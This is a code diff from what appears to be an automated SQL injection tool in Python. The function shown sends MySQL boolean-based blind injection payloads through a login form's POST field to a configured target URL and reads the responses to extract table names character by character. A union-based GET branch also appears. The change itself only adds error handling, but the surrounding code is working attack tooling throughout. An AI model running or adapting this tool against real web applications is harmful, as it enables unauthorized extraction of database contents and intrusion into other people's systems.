@@ -21,20 +21,24 @@ async def inject_payload(session, data):
     post_payload_entity_name = entity_name_payloads_boolean_based_blind["MySQL"][1].format(column=cfg.usr_column, position=data['position'], table=cfg.usr_table, offset=data['offset'], operator=data['operator'], char=data['char'])
 
     if cfg.usr_http_method == 'POST':
-        injectable_data = aiohttp.FormData()
-        injectable_data.add_field("login", post_payload_table_name)
-        injectable_data.add_field("pass", "whatever")
-        async with session.post(cfg.usr_url, data=injectable_data, headers=cfg.headers) as response:
-            sys.stdout.write("\033[s\n")
-            response_text = await response.text()
-            print(f"[*] payload: [{data['position']}]: {data['operator']}'{data['char']}' || status: {response.status}")
-            sys.stdout.flush()
+        try:
+            injectable_data = aiohttp.FormData()
+            injectable_data.add_field("login", post_payload_table_name)
+            injectable_data.add_field("pass", "whatever")
+            async with session.post(cfg.usr_url, data=injectable_data, headers=cfg.headers) as response:
+                sys.stdout.write("\033[s\n")
+                response_text = await response.text()
+                print(f"[*] payload: [{data['position']}]: {data['operator']}'{data['char']}' || status: {response.status}")
+                sys.stdout.flush()
 
-            sys.stdout.write("\033[u")
-            sys.stdout.write(f"\033[2K\r[+] table name: {data['general_name']}| offset [{data['offset']}]")
-            #return response.status == cfg.true_code
-            if not re.search(r"\[null\]", response_text):
-                return response_text
+                sys.stdout.write("\033[u")
+                sys.stdout.write(f"\033[2K\r[+] table name: {data['general_name']}| offset [{data['offset']}]")
+                #return response.status == cfg.true_code
+                if not re.search(r"\[null\]", response_text):
+                    return response_text
+        except Exception as e:
+            print("error: ", e)
+            exit(0)
     else:
         if cfg.usr_mode == 'table-test':
             async with session.get(cfg.usr_url+payload_table_name_union_based, allow_redirects=True) as response:
